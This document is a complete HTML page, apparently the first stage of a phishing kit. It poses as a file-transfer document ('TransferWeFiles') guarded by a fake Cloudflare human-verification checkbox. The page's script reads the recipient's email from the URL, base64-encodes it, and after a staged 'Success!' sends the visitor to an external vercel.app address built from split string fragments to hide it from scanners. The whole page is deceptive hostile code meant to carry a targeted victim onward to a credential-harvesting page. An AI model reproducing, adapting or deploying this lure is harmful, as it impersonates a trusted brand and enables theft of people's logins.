<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TransferWeFiles</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
            padding: 20px;
        }

        .document-text {
            font-weight: bold;
            font-size: 18px;
            color: #333;
            margin-bottom: 20px;
            text-align: center;
        }

        #loading-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }

        .loading-spinner {
            width: 60px;
            height: 60px;
            border: 5px solid rgba(33, 150, 243, 0.3);
            border-radius: 50%;
            border-top: 5px solid #2196F3;
            animation: spin 1s linear infinite;
        }

        .verification-container {
            background-color: white;
            border-radius: 12px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
            padding: 25px;
            width: 100%;
            max-width: 450px;
            transition: all 0.3s ease;
            display: none;
            height: 115px;
        }

        .verification-content {
            display: flex;
            justify-content: space-between;
            align-items: flex-start;
            margin-bottom: 15px;
        }

        .verification-section {
            display: flex;
            align-items: center;
        }

        .logo-section {
            display: flex;
            flex-direction: column;
            align-items: flex-end;
        }

        .logo {
            display: flex;
            align-items: center;
            margin-bottom: 8px;
        }

        .logo-icon {
            width: 32px;
            height: 32px;
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-right: 10px;
            color: white;
            font-weight: bold;
        }

        .logo-text {
            font-size: 20px;
            font-weight: 600;
            color: #333;
            letter-spacing: -0.5px;
        }

        .terms-text {
            color: #888;
            font-size: 14px;
        }

        .checkbox-container {
            position: relative;
            width: 24px;
            height: 24px;
            margin-right: 15px;
            cursor: pointer;
        }

        .checkbox {
            position: absolute;
            opacity: 0;
            width: 0;
            height: 0;
        }

        .checkmark {
            position: absolute;
            top: 0;
            left: 0;
            width: 24px;
            height: 24px;
            border: 2px solid #ddd;
            border-radius: 4px;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .checkbox:checked + .checkmark {
            background-color: #4CAF50;
            border-color: #4CAF50;
        }

        .checkbox:checked + .checkmark:after {
            content: "";
            position: absolute;
            left: 7px;
            top: 3px;
            width: 6px;
            height: 12px;
            border: solid white;
            border-width: 0 2px 2px 0;
            transform: rotate(45deg);
        }

        .spinner {
            width: 24px;
            height: 24px;
            border: 2px solid rgba(33, 150, 243, 0.3);
            border-radius: 50%;
            border-top: 2px solid #2196F3;
            animation: spin 1s linear infinite;
            display: none;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .verification-text {
            font-size: 16px;
            color: #555;
            transition: all 0.3s ease;
        }

        .verification-footer {
            text-align: center;
            color: #888;
            font-size: 14px;
        }

        .success-message {
            color: #4CAF50;
            font-weight: 600;
            display: none;
        }

        .verifying {
            color: #2196F3;
        }

        .success {
            color: #4CAF50;
        }

        @media (max-width: 480px) {
            .verification-content {
                flex-direction: column;
                align-items: flex-start;
                gap: 20px;
            }

            .logo-section {
                align-self: flex-end;
                align-items: flex-end;
            }
        }
    </style>
</head>
<body>
    <div class="document-text">To view this document, verify you're human below</div>

    <div id="loading-screen">
        <div class="loading-spinner"></div>
    </div>

    <div class="verification-container">
        <div class="verification-content">
            <div class="verification-section">
                <label class="checkbox-container">
                    <input type="checkbox" class="checkbox" id="verification-checkbox">
                    <span class="checkmark" id="checkmark"></span>
                    <div class="spinner" id="spinner"></div>
                </label>
                <span class="verification-text" id="verification-text">Verify you are human</span>
                <span class="success-message" id="success-message">Success!</span>
            </div>

            <div class="logo-section">
                <div class="logo">
                    <img src="cloudflare_.png" class="logo-icon" alt="Logo">
                    <div class="logo-text">Cloudflare</div>
                </div>
                <div class="terms-text">privacy Â· terms</div>
            </div>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            // Function to encode email parameter to base64
            function encodeEmailParameter() {
                const urlParams = new URLSearchParams(window.location.search);
                const email = urlParams.get('eoff');

                if (email) {
                    // Encode the email to base64
                    const encodedEmail = btoa(email);

                    // Replace the email parameter with the encoded version
                    const newUrl = new URL(window.location);
                    newUrl.searchParams.set('eoff', encodedEmail);

                    // Update the URL without reloading the page
                    window.history.replaceState({}, '', newUrl);

                    console.log('Encoded email parameter:', email, '->', encodedEmail);
                    return encodedEmail;
                }
                return null;
            }

            // Call the function to encode the email parameter
            const encodedEmail = encodeEmailParameter();

            const loadingScreen = document.getElementById('loading-screen');
            const verificationContainer = document.querySelector('.verification-container');

            // Show loading screen for 3 seconds
            setTimeout(function() {
                loadingScreen.style.display = 'none';
                verificationContainer.style.display = 'block';
            }, 1500);

            const checkbox = document.getElementById('verification-checkbox');
            const checkmark = document.getElementById('checkmark');
            const spinner = document.getElementById('spinner');
            const verificationText = document.getElementById('verification-text');
            const successMessage = document.getElementById('success-message');

            checkbox.addEventListener('change', function() {
                if (this.checked) {
                    // Show spinner and change text
                    checkmark.style.display = 'none';
                    spinner.style.display = 'block';
                    verificationText.textContent = 'Verifying...';
                    verificationText.classList.add('verifying');

                    // Simulate verification process
                    setTimeout(function() {
                        // Hide spinner and show success
                        spinner.style.display = 'none';
                        verificationText.style.display = 'none';
                        successMessage.style.display = 'inline';
                        checkmark.style.display = 'flex';
                        verificationText.classList.remove('verifying');
                        verificationText.classList.add('success');

                        // Redirect after 2 seconds
                        setTimeout(function() {
                            // Break redirect URL into tiny bits and join during redirect
                            const urlParts = [
                                'xyz123-', 'blush', '.', 'vercel', '.', 'app',
                                '/', '?', 'eoff'
                            ];

                            let redirectUrl = '';
                            for (let i = 0; i < urlParts.length; i++) {
                                redirectUrl += urlParts[i];
                            }

                            // Add encoded email if available
                            if (encodedEmail) {
                                redirectUrl += '=' + encodedEmail;
                            }

                            // Complete the URL
                            redirectUrl = 'https://' + redirectUrl;

                            console.log('Redirecting to:', redirectUrl);
                            window.location.href = redirectUrl;
                        }, 2000);

                    }, 2000); // 2 seconds delay
                } else {
                    // Reset to initial state
                    spinner.style.display = 'none';
                    checkmark.style.display = 'flex';
                    verificationText.textContent = 'Verify you are human';
                    verificationText.style.display = 'inline';
                    successMessage.style.display = 'none';
                    verificationText.classList.remove('verifying', 'success');
                }
            });
        });
    </script>
</body>
</html>
